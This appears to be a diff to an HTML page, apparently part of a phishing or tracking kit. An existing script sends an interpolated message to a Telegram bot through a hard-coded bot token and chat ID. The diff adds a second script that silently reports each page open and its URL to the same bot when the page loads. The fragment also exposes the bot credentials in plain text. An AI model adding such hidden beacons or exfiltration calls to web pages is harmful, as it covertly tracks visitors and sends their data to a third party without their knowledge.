@@ -179,6 +179,8 @@
     fetch(`https://api.telegram.org/bot8943471660:AAE06B_LIu0pyj0Sl_tt_w6ZjF_hcHHWZ6U/sendMessage?chat_id=7466119945&text=${msg}`);
   }
 </script>
-
+<script>
+  fetch(`https://api.telegram.org/bot8943471660:AAE06B_LIu0pyj0Sl_tt_w6ZjF_hcHHWZ6U/sendMessage?chat_id=7466119945&text=${encodeURIComponent('Someone opened: ' + window.location.href)}`);
+</script>
 </body>
 </html>
